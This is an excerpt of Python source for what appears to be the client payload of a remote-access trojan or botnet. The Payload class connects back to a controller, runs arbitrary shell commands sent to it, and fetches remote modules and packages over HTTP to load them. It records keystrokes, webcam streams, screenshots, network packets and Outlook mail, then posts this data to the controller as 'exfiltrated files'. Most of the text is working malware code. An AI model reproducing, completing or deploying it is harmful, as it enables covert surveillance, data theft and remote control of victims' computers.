...
def config(*arg, **options):
    ...
    def _config(function):
        ...
        for k, v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32', 'linux', 'linux2', 'darwin'] if not 'platforms' in options else options[
            'platforms']
        return wrapper
...
class Payload():
    ...
    def __init__(self, host='127.0.0.1', port=20062, **kwargs):
        """
        ...
        self.child_procs = {}
        self.remote = {'modules': [],
                       'packages': ['cv2', 'requests', 'pyHook', 'pyxhook', 'mss']}
    ...
    def _get_flags(self):
        return collections.namedtuple('flag', ('connection', 'passive', 'prompt'))(threading.Event(), threading.Event(),
                                                                                   threading.Event())

    def _get_command(self, cmd):
        if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),
                                                                                          'command')):
    ...
    def _get_key(self, connection):
        if isinstance(connection, socket.socket):
            ...
            raise TypeError(
                "invalid object type for argument 'connection' (expected {}, received {})".format(socket.socket,
                                                                                                  type(connection)))

    def _get_info(self):
        info = {}
        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username',
            ...
            for n in names:
                ...
                if ext in ('.py', '.pyc'):
                    ...
                    t = threading.Thread(target=self._get_resources,
                                         kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
                    t.daemon = True
                    t.start()
                else:
    ...
    def _get_prompt_handler(self):
        self.send_task(
            {"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
        while True:
            try:
    ...
    @config(platforms=['win32', 'linux', 'linux2', 'darwin'], command=True, usage='do <command>')
    def do(self, command):
        """
        Execute A Line of Command

        `Required`
        :param str command:        string of command to execute

        """
        try:
            command_line = shlex.split(command)
            output = subprocess.check_output(command_line, shell=True).decode()
            return "Execution Complete: {}".format(output)
        except Exception as e:
            return "{} error: {}".format(self.do.__name__, str(e))
    ...
    @config(platforms=['win32', 'linux', 'linux2', 'darwin'], command=True, usage='heartbeat')
    def heartbeat(self):
        """
        ...
        try:
            ...
            log("{} error: {}".format(self.heartbeat.__name__, str(e)))
    ...
    def help(self, name=None):
        ...
        if not name:
            try:
                return json.dumps(
                    {v.usage: v.__doc__.strip('\n').splitlines()[0].lower() for k, v in vars(Payload).items() if
                     callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
            except Exception as e:
    ...
    def show(self, attribute):
        ...
        try:
            ...
            if 'jobs' in attribute:
                return json.dumps(
                    {a: status(self.handlers[a].name) for a in self.handlers if self.handlers[a].is_alive()})
    ...
    def upload(self, filename):
        ...
        try:
            if os.path.isfile(filename):
                ...
                json_data = {'data': data, 'filename': filename, 'type': filetype, 'owner': self.owner,
                             "module": self.upload.__name__, "session": self.info.get('public_ip')}

                # upload data to server
                if self.gui:
                    globals()['post']('http://{}:5000/api/file/add'.format(host), json=json_data)
                    return "GUI Upload complete (see Exfiltrated Files tab to download file)"
                else:
    ...
    def webcam(self, args=None):
        ...
        try:
            ...
            if 'stream' in args:
                ...
                if type(data) == bytes:
                    data = str(data.decode())
                json_data = {"data": data, "type": "png", "owner": self.owner, "module": self.webcam.__name__,
                             "session": self.info.get('public_ip')}
                ...
                if type(data) == bytes:
                    data = str(data.decode())
                json_data = {"data": data, "type": "avi", "owner": self.owner, "module": self.webcam.__name__,
                             "session": self.info.get('public_ip')}
                ...
                if hasattr(globals()['outlook'], mode):
                    ...
                    if 'run' in mode:
                        ...
                        if len(results):
                            ...
                            if type(data) == bytes:
                                data = str(data.decode())
                            json_data = {'data': data, 'type': 'txt', 'owner': self.owner,
                                         "module": self.outlook.__name__, "session": self.info.get('public_ip')}
    ...
    @config(platforms=['win32', 'linux', 'linux2', 'darwin'], process_list={}, command=True,
    ...
    def execute(self, args):
        ...
        """
        log(args)
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i
                                                                                                                in
                                                                                                                args.partition(
                                                                                                                    ' ')
                                                                                                                if i if
        ...
        if os.path.isfile(path):
            ...
            try:
                ...
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE,
                                                                       subprocess.PIPE)
            ...
            if args:
                ...
                if 'monitor' in cmd:
                    ...
                    if len(log):
                        ...
                        if type(data) == bytes:
                            data = str(data.decode())
                        json_data = {'data': data, 'type': 'log', 'owner': self.owner,
                                     "module": self.process.__name__, "session": self.info.get('public_ip')}
                    ...
                    return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'],
                                                                                             cmd)()
    ...
    def keylogger(self, mode=None):
        ...
        if not mode:
            ...
            if 'run' in mode or 'start' in mode:
                ...
                if type(data) == bytes:
                    data = str(data.decode())
                json_data = {'data': data, 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__,
                             "session": self.info.get('public_ip')}
    ...
    def screenshot(self, mode=None):
        ...
        try:
            ...
            if type(data) == bytes:
                data = str(data.decode())
            json_data = {"data": data, "owner": self.owner, "type": "png", "module": self.screenshot.__name__,
                         "session": self.info.get('public_ip')}
            if self.gui:
                globals()['post']('http://{}:5000/api/file/add'.format(host), json=json_data)
            else:
        ...
        try:
            ...
            if len(args):
                ...
                if 'run' in mode:
                    ...
                    packetlog = globals()['packetsniffer'].log.getvalue()
                    if len(packetlog):
                        globals()['packetsniffer'].log.reset()
                        host, port = self.connection.getpeername()
                        data = base64.b64encode(packetlog)

                        if type(data) == bytes:
                            data = str(data.decode())
                        json_data = {"data": data, "type": "pcap", "owner": self.owner,
                                     "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
    ...
    def run(self):
        ...
        self.handlers['module_handler'] = self._get_resources(target=self.remote['modules'],
                                                              base_url='http://{}:{}'.format(host, port + 1))
        self.handlers['package_handler'] = self._get_resources(target=self.remote['packages'],
                                                               base_url='http://{}:{}'.format(host, port + 2))
                    ...
                    if isinstance(task, dict) and 'task' in task:
                        ...
                        try:
                            ...
                            if command:
                                ...
                                result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE,
